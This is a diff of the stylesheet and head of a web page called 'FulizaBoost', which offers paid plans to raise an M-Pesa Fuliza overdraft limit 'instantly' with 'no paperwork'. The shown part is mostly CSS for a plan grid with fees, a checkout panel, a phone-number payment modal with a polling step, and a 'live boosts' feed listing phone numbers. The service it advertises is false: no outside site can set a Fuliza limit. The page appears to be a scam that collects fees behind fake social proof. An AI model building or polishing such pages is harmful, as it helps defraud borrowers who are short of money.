@@ -6,224 +6,121 @@
 <title>FulizaBoost — Instant Fuliza Limit Increase</title>
 <meta name="description" content="Boost your M-Pesa Fuliza limit instantly. No paperwork. Same day access.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-/* ═══════════════════════════════ RESET & TOKENS ════════════════════════════ */
 :root{
-  --g:#00D158; --g2:#00A845; --gold:#FFD147;
-  --dark:#030b04; --card:rgba(8,22,10,.90);
-  --border:rgba(0,209,88,.18); --text:#e6f4e8; --muted:#6fa872;
+  --g:#00D158;--g2:#00A845;--gold:#FFD147;
+  --dark:#030b04;--surface:#0a1a0c;--card:rgba(10,26,14,.95);
+  --border:rgba(0,209,88,.16);--text:#e4f2e6;--muted:#6b9e6d;
 }
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
-html,body{
-  width:100%;height:100%;
+html{scroll-behavior:smooth;-webkit-font-smoothing:antialiased;}
+body{
   font-family:'Plus Jakarta Sans',sans-serif;
-  background:var(--dark); color:var(--text);
-  overflow:hidden; /* pages handle their own scroll */
-  -webkit-font-smoothing:antialiased;
+  background:var(--dark);color:var(--text);
+  min-height:100vh;overflow-x:hidden;
 }
 
-/* ═══════════════════════════════ PAGE SYSTEM ════════════════════════════════
-   Two full-screen "pages". JS swaps .active class to slide between them.
-════════════════════════════════════════════════════════════════════════════ */
-.page{
-  position:fixed; inset:0;
-  width:100%; height:100%;
-  transition:transform .55s cubic-bezier(.77,0,.18,1), opacity .45s ease;
-  overflow-y:auto; overflow-x:hidden;
+/* ── TOP BAR ── */
+.topbar{
+  position:sticky;top:0;z-index:100;
+  background:rgba(3,11,4,.96);
+  border-bottom:1px solid var(--border);
+  backdrop-filter:blur(16px);
 }
-/* page 1 sits at natural position */
-#page1{ transform:translateX(0); opacity:1; z-index:2; }
-/* page 2 waits off-screen to the right */
-#page2{ transform:translateX(100%); opacity:0; z-index:1; }
-
-/* when page1 is dismissed it slides left */
-#page1.slide-out{ transform:translateX(-100%); opacity:0; z-index:1; }
-/* when page2 becomes active it slides in from right */
-#page2.active{ transform:translateX(0); opacity:1; z-index:2; }
-
-/* ═══════════════════════════════ PAGE 1 — HERO ══════════════════════════════ */
-#page1{
-  display:flex; flex-direction:column;
-  min-height:100vh;
+.topbar-inner{
+  max-width:1200px;margin:0 auto;
+  padding:14px 28px;
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
 }
-
-.hero-bg{
-  position:fixed; inset:0; z-index:0;
-  background:
-    url('https://images.unsplash.com/photo-1573164574572-cb89e39749b4?w=1800&q=88&auto=format&fit=crop&crop=focalpoint&fp-x=.6&fp-y=.4')
-    center/cover no-repeat;
-}
-.hero-bg::before{
-  content:'';position:absolute;inset:0;
-  background:
-    linear-gradient(105deg,rgba(3,11,4,.97) 0%,rgba(3,11,4,.88) 42%,rgba(3,11,4,.38) 72%,rgba(3,11,4,.12) 100%),
-    linear-gradient(to bottom,rgba(3,11,4,.08) 0%,rgba(3,11,4,.72) 70%,rgba(3,11,4,1) 100%);
-}
-.hero-bg::after{
-  content:'';position:absolute;inset:0;
-  background:radial-gradient(ellipse 55% 75% at 80% 42%,rgba(0,180,70,.09),transparent 68%);
-}
-/* orbs */
-.orb{position:absolute;border-radius:50%;filter:blur(110px);pointer-events:none;z-index:1;animation:breathe 9s ease-in-out infinite alternate;}
-.o1{width:520px;height:520px;background:rgba(0,185,65,.13);top:-200px;left:-160px;animation-delay:0s;}
-.o2{width:300px;height:300px;background:rgba(0,209,88,.09);bottom:40px;right:3%;animation-delay:3.5s;}
-.o3{width:200px;height:200px;background:rgba(255,209,71,.06);top:40%;left:58%;animation-delay:6s;}
-@keyframes breathe{from{transform:scale(1);opacity:.65}to{transform:scale(1.18);opacity:1}}
-
-/* ── TICKER ── */
-.ticker-bar{
-  position:relative;z-index:10;
-  background:rgba(0,209,88,.07);
-  border-bottom:1px solid rgba(0,209,88,.13);
-  overflow:hidden;padding:9px 0;flex-shrink:0;
-}
-.ticker-track{display:flex;gap:56px;animation:tickMove 32s linear infinite;white-space:nowrap;}
-.ti{display:flex;align-items:center;gap:7px;font-size:.74rem;color:var(--g);flex-shrink:0;}
-.ti::before{content:'✓';font-size:.62rem;background:var(--g);color:#000;border-radius:99px;padding:1px 5px;font-weight:800;}
-@keyframes tickMove{from{transform:translateX(0)}to{transform:translateX(-50%)}}
-
-/* ── NAV ── */
-.nav{
-  position:relative;z-index:10;
-  display:flex;align-items:center;justify-content:space-between;
-  padding:24px 48px 0; flex-shrink:0;
-}
-.logo{font-size:1.45rem;font-weight:800;color:#fff;text-decoration:none;letter-spacing:-.5px;}
+.logo{font-size:1.35rem;font-weight:800;color:#fff;text-decoration:none;letter-spacing:-.5px;}
 .logo em{color:var(--g);font-style:normal;}
-.nav-pill{
+.topbar-right{display:flex;align-items:center;gap:12px;}
+.live-pill{
   display:flex;align-items:center;gap:6px;
-  padding:7px 16px;border-radius:99px;
+  padding:6px 14px;border-radius:99px;
   background:rgba(0,209,88,.1);border:1px solid rgba(0,209,88,.25);
-  font-size:.72rem;font-weight:700;color:var(--g);letter-spacing:.4px;
+  font-size:.72rem;font-weight:700;color:var(--g);
 }
 .pdot{width:6px;height:6px;background:var(--g);border-radius:50%;animation:blink 1.5s infinite;}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:.1}}
 
-/* ── HERO BODY ── */
-.hero-body{
-  position:relative;z-index:5;
-  flex:1;display:flex;align-items:center;
-  padding:0 48px 60px;
-  max-width:780px;
+/* ── TICKER ── */
+.ticker{
+  background:rgba(0,209,88,.06);
+  border-bottom:1px solid rgba(0,209,88,.12);
+  overflow:hidden;padding:8px 0;
 }
-.hero-copy{}
-.eyebrow{
-  display:inline-flex;align-items:center;gap:8px;
-  background:rgba(0,209,88,.1);border:1px solid rgba(0,209,88,.28);
-  border-radius:99px;padding:7px 16px;
-  font-size:.73rem;font-weight:700;color:var(--g);
-  letter-spacing:.5px;text-transform:uppercase;margin-bottom:22px;
-  animation:up .6s .1s both;
+.ticker-track{
+  display:flex;gap:52px;
+  animation:tickMove 30s linear infinite;
+  white-space:nowrap;
 }
-h1{
-  font-size:clamp(2.8rem,5.5vw,4.6rem);
-  font-weight:800;line-height:1.04;letter-spacing:-2.5px;
-  color:#fff;margin-bottom:20px;
-  animation:up .65s .18s both;
-}
-h1 .hi{color:var(--g);}
-.tagline{
-  font-size:clamp(.95rem,1.6vw,1.1rem);
-  color:rgba(210,235,212,.72);line-height:1.72;
-  max-width:500px;margin-bottom:34px;
-  animation:up .65s .26s both;
-}
-/* trust badges */
-.trust{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:42px;animation:up .65s .33s both;}
-.tb{
+.ti{
   display:flex;align-items:center;gap:7px;
-  background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.09);
-  border-radius:10px;padding:9px 14px;font-size:.78rem;color:rgba(200,230,202,.82);
+  font-size:.73rem;color:var(--g);flex-shrink:0;
 }
-/* stats */
-.stats{display:flex;gap:28px;flex-wrap:wrap;margin-bottom:44px;animation:up .65s .38s both;}
-.st-n{font-size:1.9rem;font-weight:800;letter-spacing:-1px;color:#fff;line-height:1;}
-.st-n em{color:var(--g);font-size:1.15rem;font-style:normal;}
-.st-l{font-size:.7rem;color:var(--muted);margin-top:3px;}
-.st-div{width:1px;background:rgba(255,255,255,.1);align-self:stretch;}
-/* CTA */
-.hero-cta{
-  display:inline-flex;align-items:center;gap:12px;
-  padding:18px 38px;
-  background:linear-gradient(135deg,#00D158,#00A845);
-  color:#000;font-weight:800;font-size:1.05rem;
-  border:none;border-radius:14px;cursor:pointer;
-  transition:all .2s;
-  box-shadow:0 6px 32px rgba(0,209,88,.4),0 2px 10px rgba(0,0,0,.3);
-  letter-spacing:-.1px;
-  animation:up .7s .44s both;
+.ti-dot{
+  width:7px;height:7px;background:var(--g);border-radius:50%;
+  flex-shrink:0;animation:blink 1.5s infinite;
 }
-.hero-cta:hover{transform:translateY(-3px);box-shadow:0 12px 44px rgba(0,209,88,.55);background:linear-gradient(135deg,#00e865,#00b84a);}
-.cta-arrow{font-size:1.2rem;transition:transform .2s;}
-.hero-cta:hover .cta-arrow{transform:translateX(5px);}
-@keyframes up{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+@keyframes tickMove{from{transform:translateX(0)}to{transform:translateX(-50%)}}
 
-/* ═══════════════════════════════ PAGE 2 — LIMIT PLANS ═══════════════════════ */
-#page2{
-  background:var(--dark);
-  display:flex;flex-direction:column;min-height:100vh;
-}
-.p2-header{
-  display:flex;align-items:center;justify-content:space-between;
-  padding:22px 48px;
-  border-bottom:1px solid var(--border);
-  flex-shrink:0;position:sticky;top:0;
-  background:rgba(3,11,4,.95);backdrop-filter:blur(16px);
-  z-index:20;
-}
-.p2-logo{font-size:1.3rem;font-weight:800;color:#fff;text-decoration:none;}
-.p2-logo em{color:var(--g);font-style:normal;}
-.back-btn{
-  display:flex;align-items:center;gap:8px;
-  padding:8px 18px;border-radius:99px;
-  background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
-  color:var(--muted);font-size:.82rem;cursor:pointer;transition:all .18s;
-}
-.back-btn:hover{background:rgba(255,255,255,.1);color:#fff;}
-
-/* ── plan page body ── */
-.p2-body{
-  flex:1;
+/* ── MAIN LAYOUT ── */
+.main{
+  max-width:1200px;margin:0 auto;
+  padding:32px 28px 60px;
   display:grid;
-  grid-template-columns:1fr 420px;
-  gap:0;
-  max-width:1200px;
-  margin:0 auto;
-  width:100%;
-  padding:40px 48px 60px;
+  grid-template-columns:1fr 440px;
+  gap:32px;
   align-items:start;
 }
 
-/* LEFT: title + grid */
-.plans-left{}
+/* ── LEFT: Plans ── */
+.plans-col{}
+.plans-header{margin-bottom:24px;}
 .plans-eyebrow{
   font-size:.68rem;text-transform:uppercase;letter-spacing:2.5px;
-  color:var(--g);margin-bottom:12px;
+  color:var(--g);margin-bottom:10px;
 }
 .plans-title{
-  font-size:clamp(1.8rem,3vw,2.5rem);font-weight:800;
-  letter-spacing:-1.2px;color:#fff;margin-bottom:8px;
+  font-size:clamp(1.8rem,3vw,2.6rem);font-weight:800;
+  letter-spacing:-1.5px;color:#fff;line-height:1.08;margin-bottom:8px;
 }
-.plans-sub{font-size:.88rem;color:var(--muted);margin-bottom:30px;line-height:1.6;}
+.plans-title em{color:var(--g);font-style:normal;}
+.plans-sub{font-size:.86rem;color:var(--muted);line-height:1.65;max-width:480px;}
 
-/* the grid itself */
+/* stats strip */
+.stats-strip{
+  display:flex;gap:0;
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:14px;overflow:hidden;margin-bottom:24px;
+}
+.stat-b{
+  flex:1;padding:16px 14px;text-align:center;
+  border-right:1px solid var(--border);
+}
+.stat-b:last-child{border-right:none;}
+.stat-n{font-size:1.5rem;font-weight:800;color:var(--g);letter-spacing:-1px;line-height:1;}
+.stat-l{font-size:.67rem;color:var(--muted);margin-top:3px;}
+
+/* limit grid */
 .limit-grid{
   display:grid;
   grid-template-columns:repeat(4,1fr);
-  gap:10px;
-  margin-bottom:28px;
+  gap:9px;
+  margin-bottom:0;
 }
 .lb{
   background:rgba(0,209,88,.05);
-  border:1.5px solid rgba(0,209,88,.16);
-  border-radius:13px;padding:14px 10px;
+  border:1.5px solid rgba(0,209,88,.15);
+  border-radius:13px;padding:13px 8px;
   text-align:center;cursor:pointer;
-  transition:all .17s ease;position:relative;overflow:hidden;
+  transition:all .16s ease;position:relative;overflow:hidden;
   user-select:none;
 }
 .lb:hover{border-color:var(--g);transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,209,88,.18);}
-.lb.on{border-color:var(--g);background:rgba(0,209,88,.15);box-shadow:0 0 0 3px rgba(0,209,88,.22);}
+.lb.on{border-color:var(--g);background:rgba(0,209,88,.15);box-shadow:0 0 0 3px rgba(0,209,88,.2);transform:translateY(-1px);}
 .lb.on .ck{display:flex;}
 .ck{
   display:none;position:absolute;top:5px;right:6px;
@@ -231,339 +128,311 @@ h1 .hi{color:var(--g);}
   background:var(--g);align-items:center;justify-content:center;
   font-size:.5rem;color:#000;font-weight:900;
 }
-.lb-amt{font-size:.86rem;font-weight:700;color:#fff;line-height:1.2;}
-.lb-fee{font-size:.67rem;color:var(--muted);margin-top:3px;}
+.lb-amt{font-size:.84rem;font-weight:700;color:#fff;line-height:1.2;}
+.lb-fee{font-size:.65rem;color:var(--muted);margin-top:2px;}
 
-/* RIGHT: sticky checkout panel */
-.checkout-panel{
-  position:sticky;top:90px;
+/* ── RIGHT: Checkout panel ── */
+.checkout-col{
+  position:sticky;top:88px;
+}
+.checkout-card{
   background:var(--card);
   border:1px solid var(--border);
   border-radius:22px;
-  backdrop-filter:blur(20px);
-  box-shadow:0 30px 80px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.03);
   overflow:hidden;
-  margin-left:32px;
+  box-shadow:0 24px 70px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.03);
+  margin-bottom:18px;
 }
-.cp-head{
-  padding:22px 24px 18px;
+.cc-head{
+  padding:20px 22px 16px;
   background:rgba(0,209,88,.05);
   border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
 }
-.cp-head-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px;}
-.cp-title{font-size:1rem;font-weight:700;}
-.cp-badge{
+.cc-title{font-size:.98rem;font-weight:700;}
+.cc-badge{
   font-size:.62rem;font-weight:700;letter-spacing:.6px;text-transform:uppercase;
   background:rgba(0,209,88,.15);color:var(--g);
   border:1px solid rgba(0,209,88,.3);border-radius:99px;padding:3px 10px;
 }
-.cp-sub{font-size:.78rem;color:var(--muted);}
-.cp-body{padding:20px 24px 22px;}
+.cc-body{padding:18px 22px 20px;}
 
-/* empty / selected state */
 .cp-empty{
-  text-align:center;padding:32px 20px;
-  color:var(--muted);font-size:.85rem;
+  text-align:center;padding:26px 16px;
+  color:var(--muted);font-size:.82rem;
   border:1.5px dashed rgba(0,209,88,.18);
-  border-radius:12px;margin-bottom:16px;
+  border-radius:12px;margin-bottom:14px;
 }
-.cp-empty span{font-size:2rem;display:block;margin-bottom:10px;}
+.cp-empty span{font-size:1.8rem;display:block;margin-bottom:8px;}
+
 .order-box{
   display:none;
   background:rgba(0,209,88,.07);border:1px solid rgba(0,209,88,.18);
-  border-radius:12px;padding:14px 16px;margin-bottom:16px;
+  border-radius:12px;padding:13px 15px;margin-bottom:14px;
 }
 .order-box.show{display:block;}
-.or{display:flex;justify-content:space-between;font-size:.83rem;margin-bottom:5px;}
-.or:last-child{margin:0;border-top:1px solid rgba(0,209,88,.14);padding-top:8px;margin-top:7px;}
+.or{display:flex;justify-content:space-between;font-size:.82rem;margin-bottom:5px;}
+.or:last-child{margin:0;border-top:1px solid rgba(0,209,88,.14);padding-top:7px;margin-top:6px;}
 .ok{color:var(--muted);}
 .ov{font-weight:600;color:#fff;}
-.ovg{font-weight:800;color:var(--g);font-size:.9rem;}
+.ovg{font-weight:800;color:var(--g);}
 
 .pay-cta{
-  display:flex;align-items:center;justify-content:center;gap:9px;
-  width:100%;padding:16px;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  width:100%;padding:15px;
   background:linear-gradient(135deg,#00D158,#00A845);
-  color:#000;font-weight:800;font-size:.95rem;
+  color:#000;font-weight:800;font-size:.93rem;
   font-family:'Plus Jakarta Sans',sans-serif;
   border:none;border-radius:12px;cursor:pointer;
   transition:all .18s;
-  box-shadow:0 5px 26px rgba(0,209,88,.38);
+  box-shadow:0 5px 24px rgba(0,209,88,.38);
 }
-.pay-cta:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 38px rgba(0,209,88,.5);background:linear-gradient(135deg,#00e865,#00b84a);}
-.pay-cta:disabled{opacity:.4;cursor:not-allowed;background:linear-gradient(135deg,#00D158,#00A845);}
-.sec-row{display:flex;justify-content:center;gap:14px;flex-wrap:wrap;margin-top:13px;}
-.sec-b{font-size:.67rem;color:var(--muted);display:flex;align-items:center;gap:4px;}
+.pay-cta:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 36px rgba(0,209,88,.5);}
+.pay-cta:disabled{opacity:.38;cursor:not-allowed;transform:none;}
+.sec-row{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:12px;}
+.sec-b{font-size:.65rem;color:var(--muted);display:flex;align-items:center;gap:4px;}
 
-/* ── HOW IT WORKS strip at bottom of page 2 ── */
-.how-strip{
-  border-top:1px solid var(--border);
-  padding:40px 48px 50px;
-  flex-shrink:0;
+/* ── LIVE BOOSTS PANEL ── */
+.live-panel{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:18px;overflow:hidden;
+}
+.lp-head{
+  padding:14px 18px;background:rgba(0,209,88,.05);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.lp-title{font-size:.88rem;font-weight:700;display:flex;align-items:center;gap:8px;}
+.lp-count{font-size:.68rem;color:var(--muted);}
+.boosts-list{max-height:320px;overflow-y:auto;}
+.boosts-list::-webkit-scrollbar{width:3px;}
+.boosts-list::-webkit-scrollbar-thumb{background:rgba(0,209,88,.2);border-radius:2px;}
+.boost-item{
+  display:flex;align-items:center;gap:10px;
+  padding:10px 18px;
+  border-bottom:1px solid rgba(255,255,255,.04);
+  animation:slideInBoost .4s ease both;
+}
+.boost-item:last-child{border-bottom:none;}
+@keyframes slideInBoost{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
+.boost-avatar{
+  width:30px;height:30px;border-radius:50%;
+  background:linear-gradient(135deg,rgba(0,209,88,.2),rgba(0,209,88,.08));
+  border:1px solid rgba(0,209,88,.25);
+  display:flex;align-items:center;justify-content:center;
+  font-size:.8rem;flex-shrink:0;
+}
+.boost-info{flex:1;min-width:0;}
+.boost-phone{font-size:.78rem;font-weight:600;color:#fff;}
+.boost-limit{font-size:.68rem;color:var(--g);font-weight:700;}
+.boost-time{font-size:.63rem;color:var(--muted);flex-shrink:0;}
+.boost-check{font-size:.9rem;flex-shrink:0;}
+
+/* ── HOW IT WORKS ── */
+.how{
+  max-width:1200px;margin:0 auto;
+  padding:0 28px 60px;
 }
 .how-label{font-size:.66rem;text-transform:uppercase;letter-spacing:2.5px;color:var(--g);margin-bottom:10px;}
-.how-h{font-size:1.3rem;font-weight:800;letter-spacing:-.8px;color:#fff;margin-bottom:24px;}
-.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.how-h{font-size:clamp(1.4rem,2.5vw,2rem);font-weight:800;letter-spacing:-1px;color:#fff;margin-bottom:22px;}
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
 .step{
-  background:rgba(255,255,255,.03);border:1px solid var(--border);
+  background:var(--surface);border:1px solid var(--border);
   border-radius:14px;padding:20px 16px;
+  position:relative;overflow:hidden;
+  transition:transform .2s,box-shadow .2s;
 }
-.sn{font-size:2rem;font-weight:800;color:rgba(0,209,88,.13);line-height:1;margin-bottom:10px;}
-.step h4{font-size:.88rem;font-weight:700;margin-bottom:6px;}
-.step p{font-size:.76rem;color:var(--muted);line-height:1.6;}
+.step::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--g),transparent);
+  opacity:0;transition:opacity .2s;
+}
+.step:hover{transform:translateY(-3px);box-shadow:0 12px 36px rgba(0,209,88,.1);}
+.step:hover::before{opacity:1;}
+.sn{font-size:1.8rem;font-weight:800;color:rgba(0,209,88,.12);line-height:1;margin-bottom:10px;}
+.step h4{font-size:.86rem;font-weight:700;margin-bottom:6px;}
+.step p{font-size:.75rem;color:var(--muted);line-height:1.6;}
 
-/* ═══════════════════════════════ MODAL ═════════════════════════════════════ */
+/* ── MODAL ── */
 .backdrop{
   display:none;position:fixed;inset:0;z-index:500;
-  background:rgba(0,0,0,.82);backdrop-filter:blur(8px);
+  background:rgba(0,0,0,.85);backdrop-filter:blur(8px);
   align-items:center;justify-content:center;padding:16px;
 }
 .backdrop.open{display:flex;}
 .modal{
-  background:#091509;border:1px solid var(--border);
-  border-radius:24px;width:100%;max-width:440px;
-  padding:34px 30px;position:relative;
+  background:#071008;border:1px solid var(--border);
+  border-radius:22px;width:100%;max-width:420px;
+  padding:30px 26px;position:relative;
   box-shadow:0 40px 100px rgba(0,0,0,.7);
   animation:popIn .25s cubic-bezier(.34,1.56,.64,1) both;
 }
 @keyframes popIn{from{opacity:0;transform:scale(.88)}to{opacity:1;transform:scale(1)}}
 .mclose{
-  position:absolute;top:14px;right:16px;
+  position:absolute;top:13px;right:14px;
   background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);
-  border-radius:50%;width:30px;height:30px;
+  border-radius:50%;width:28px;height:28px;
   display:flex;align-items:center;justify-content:center;
-  color:var(--muted);font-size:1.1rem;cursor:pointer;transition:all .15s;
+  color:var(--muted);font-size:1rem;cursor:pointer;transition:all .15s;
 }
 .mclose:hover{background:rgba(255,255,255,.14);color:#fff;}
-.modal h3{font-size:1.2rem;font-weight:800;letter-spacing:-.5px;margin-bottom:4px;}
-.msub{font-size:.82rem;color:var(--muted);margin-bottom:20px;}
+.modal h3{font-size:1.15rem;font-weight:800;letter-spacing:-.5px;margin-bottom:4px;}
+.msub{font-size:.8rem;color:var(--muted);margin-bottom:18px;}
 .m-order{
   background:rgba(0,209,88,.07);border:1px solid rgba(0,209,88,.18);
-  border-radius:12px;padding:14px 16px;margin-bottom:20px;
+  border-radius:11px;padding:13px 15px;margin-bottom:18px;
 }
-.fg{margin-bottom:14px;}
-.fl{display:block;font-size:.74rem;color:var(--muted);margin-bottom:5px;font-weight:600;}
+.fg{margin-bottom:13px;}
+.fl{display:block;font-size:.72rem;color:var(--muted);margin-bottom:5px;font-weight:600;}
 .fi{
-  width:100%;padding:13px 15px;
+  width:100%;padding:12px 14px;
   background:rgba(255,255,255,.04);border:1.5px solid rgba(255,255,255,.1);
-  border-radius:11px;color:#fff;font-size:.92rem;
+  border-radius:10px;color:#fff;font-size:.9rem;
   font-family:'Plus Jakarta Sans',sans-serif;outline:none;transition:border-color .2s;
 }
 .fi:focus{border-color:var(--g);}
-.fi::placeholder{color:rgba(255,255,255,.25);}
+.fi::placeholder{color:rgba(255,255,255,.22);}
 .ph-row{display:flex;}
 .pfx{
-  padding:13px 14px;background:rgba(0,209,88,.1);
+  padding:12px 13px;background:rgba(0,209,88,.1);
   border:1.5px solid rgba(0,209,88,.2);border-right:none;
-  border-radius:11px 0 0 11px;color:var(--g);font-size:.88rem;font-weight:700;
+  border-radius:10px 0 0 10px;color:var(--g);font-size:.86rem;font-weight:700;
   display:flex;align-items:center;
 }
-.ph-row .fi{border-radius:0 11px 11px 0;}
-.ferr{font-size:.72rem;color:#ff6b6b;margin-top:4px;display:none;}
+.ph-row .fi{border-radius:0 10px 10px 0;}
+.ferr{font-size:.7rem;color:#ff6b6b;margin-top:4px;display:none;}
 .note-box{
   display:flex;gap:9px;align-items:flex-start;
-  background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);
-  border-radius:10px;padding:11px 13px;
-  font-size:.76rem;color:var(--muted);line-height:1.55;margin-bottom:18px;
+  background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);
+  border-radius:9px;padding:10px 12px;
+  font-size:.74rem;color:var(--muted);line-height:1.55;margin-bottom:16px;
 }
 .pay-btn{
   display:flex;align-items:center;justify-content:center;gap:8px;
-  width:100%;padding:15px;
+  width:100%;padding:14px;
   background:linear-gradient(135deg,#00D158,#00A845);
-  color:#000;font-weight:800;font-size:.92rem;
+  color:#000;font-weight:800;font-size:.9rem;
   font-family:'Plus Jakarta Sans',sans-serif;
-  border:none;border-radius:12px;cursor:pointer;transition:all .18s;
-  box-shadow:0 4px 22px rgba(0,209,88,.35);
+  border:none;border-radius:11px;cursor:pointer;transition:all .18s;
+  box-shadow:0 4px 20px rgba(0,209,88,.35);
 }
-.pay-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 32px rgba(0,209,88,.48);}
+.pay-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,209,88,.48);}
 .pay-btn:disabled{opacity:.5;cursor:not-allowed;}
-.spin{display:inline-block;width:16px;height:16px;border:2px solid rgba(0,0,0,.2);border-top-color:#000;border-radius:50%;animation:spin .65s linear infinite;}
+.spin{display:inline-block;width:15px;height:15px;border:2px solid rgba(0,0,0,.2);border-top-color:#000;border-radius:50%;animation:spin .65s linear infinite;}
 @keyframes spin{to{transform:rotate(360deg)}}
-/* waiting */
-.wait-icon{font-size:3.5rem;text-align:center;margin-bottom:16px;animation:wiggle 2s ease-in-out infinite;}
-@keyframes wiggle{0%,100%{transform:rotate(0)}15%{transform:rotate(-8deg)}30%{transform:rotate(8deg)}45%{transform:rotate(-5deg)}60%{transform:rotate(5deg)}75%{transform:rotate(-3deg)}}
-.poll-bar{width:100%;height:4px;background:rgba(255,255,255,.08);border-radius:2px;overflow:hidden;margin:18px 0;}
+
+/* waiting step */
+.wait-icon{font-size:3.2rem;text-align:center;margin-bottom:14px;animation:wiggle 2s ease-in-out infinite;}
+@keyframes wiggle{0%,100%{transform:rotate(0)}15%{transform:rotate(-8deg)}30%{transform:rotate(8deg)}45%{transform:rotate(-4deg)}60%{transform:rotate(4deg)}75%{transform:rotate(-2deg)}}
+.poll-bar{width:100%;height:4px;background:rgba(255,255,255,.08);border-radius:2px;overflow:hidden;margin:16px 0;}
 .poll-fill{height:100%;background:linear-gradient(90deg,var(--g2),var(--g));border-radius:2px;animation:polling 3s ease-in-out infinite;}
 @keyframes polling{0%{width:0%}50%{width:90%}100%{width:0%}}
-/* success */
+.wait-steps{
+  background:rgba(0,209,88,.05);border:1px solid rgba(0,209,88,.13);
+  border-radius:11px;padding:13px 15px;
+  font-size:.76rem;color:var(--muted);line-height:1.75;text-align:left;
+}
+.wait-steps strong{color:#fff;display:block;margin-bottom:5px;}
+
+/* success step */
 .suc-ring{
-  width:72px;height:72px;border-radius:50%;
+  width:68px;height:68px;border-radius:50%;
   background:rgba(0,209,88,.15);border:2px solid rgba(0,209,88,.35);
   display:flex;align-items:center;justify-content:center;
-  font-size:2.2rem;margin:0 auto 18px;
+  font-size:2rem;margin:0 auto 16px;
   animation:ringPop .4s cubic-bezier(.34,1.56,.64,1) both;
 }
 @keyframes ringPop{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
 
 /* toast */
 .toast{
-  position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(16px);
+  position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(16px);
   background:#0d2010;border:1px solid var(--g);
-  border-radius:99px;padding:12px 24px;
-  font-size:.82rem;color:var(--g);
+  border-radius:99px;padding:11px 22px;
+  font-size:.8rem;color:var(--g);
   z-index:9999;opacity:0;pointer-events:none;
-  transition:all .3s;white-space:nowrap;
+  transition:all .3s;white-space:nowrap;max-width:90vw;text-align:center;
 }
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
-.toast.err{border-color:#ff6b6b;color:#ff6b6b;background:#1a0808;}
+.toast.err{border-color:#ff6b6b;color:#ff6b6b;background:#190808;}
 
-/* ═══════════════════════════════ RESPONSIVE ════════════════════════════════ */
-@media(max-width:1024px){
-  .p2-body{grid-template-columns:1fr;padding:28px 28px 48px;}
-  .checkout-panel{margin-left:0;margin-top:28px;position:static;}
-  .steps{grid-template-columns:repeat(2,1fr);}
+/* ── RESPONSIVE ── */
+@media(max-width:960px){
+  .main{grid-template-columns:1fr;gap:24px;padding:24px 20px 48px;}
+  .checkout-col{position:static;}
   .limit-grid{grid-template-columns:repeat(4,1fr);}
-  .how-strip{padding:32px 28px 40px;}
+  .steps{grid-template-columns:repeat(2,1fr);}
+  .how{padding:0 20px 48px;}
 }
-@media(max-width:768px){
-  .nav,.p2-header{padding:18px 20px 0 20px;}
-  .p2-header{padding:16px 20px;}
-  .hero-body{padding:0 20px 48px;}
-  h1{font-size:clamp(2.2rem,7.5vw,3rem);letter-spacing:-1.5px;}
-  .tagline{font-size:.93rem;}
-  .hero-cta{padding:15px 28px;font-size:.95rem;}
-  .p2-body{padding:20px 16px 40px;}
-  .limit-grid{grid-template-columns:repeat(3,1fr);gap:8px;}
-  .steps{grid-template-columns:1fr 1fr;}
-  .how-strip{padding:24px 16px 36px;}
-  .plans-title{font-size:1.7rem;}
-  .stats{gap:18px;}
-}
-@media(max-width:480px){
-  .limit-grid{grid-template-columns:repeat(3,1fr);gap:6px;}
-  .lb{padding:11px 6px;}
-  .lb-amt{font-size:.78rem;}
-  .lb-fee{font-size:.61rem;}
+@media(max-width:560px){
+  .topbar-inner{padding:12px 16px;}
+  .main{padding:18px 14px 40px;}
+  .limit-grid{grid-template-columns:repeat(3,1fr);gap:7px;}
+  .lb{padding:10px 5px;}
+  .lb-amt{font-size:.76rem;}
+  .lb-fee{font-size:.6rem;}
   .steps{grid-template-columns:1fr;}
-  .trust{gap:8px;}
-  .modal{padding:26px 16px;}
-  .stats{gap:14px;}
-  .st-n{font-size:1.55rem;}
+  .stats-strip{display:none;}
+  .how{padding:0 14px 40px;}
+  .modal{padding:22px 14px;}
 }
 </style>
 </head>
 <body>
 
-<!-- ══════════════════════════════════════════════════
-     PAGE 1 — LANDING HERO
-══════════════════════════════════════════════════ -->
-<div id="page1" class="page">
-  <div class="hero-bg"></div>
-  <div class="orb o1"></div>
